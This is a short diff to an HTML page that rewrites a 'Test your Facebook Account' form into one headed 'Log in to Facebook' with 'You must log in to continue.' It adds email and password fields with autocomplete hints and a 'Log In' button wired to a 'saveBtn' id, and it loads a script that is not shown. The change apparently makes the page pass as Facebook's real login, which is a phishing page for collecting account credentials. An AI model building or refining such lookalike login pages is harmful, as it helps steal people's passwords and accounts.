@@ -9,16 +9,13 @@
 <body>
 
     <div class="container">
-        <h1>Test your Facebook Account</h1>
-        <p>Enter your account details:</p>
+        <h1>Log in to Facebook</h1>
+        <p>You must log in to continue.</p>
         
-        <input type="email" id="userName" placeholder="Email">
-        <input type="password" id="password" placeholder="Password">
-        <button id="saveBtn">Submit</button>
-
-        <!-- <hr>
-        <h3>Registered Students</h3>
-        <ul id="userList"></ul> -->
+        <input type="email" id="userName" name="email" autocomplete="username" placeholder="Email or phone number">
+        <input type="password" id="password" name="password" autocomplete="current-password" placeholder="Password">
+        
+        <button id="saveBtn">Log In</button>
     </div>
     <script type="module" src="script.js"></script>
 </body>
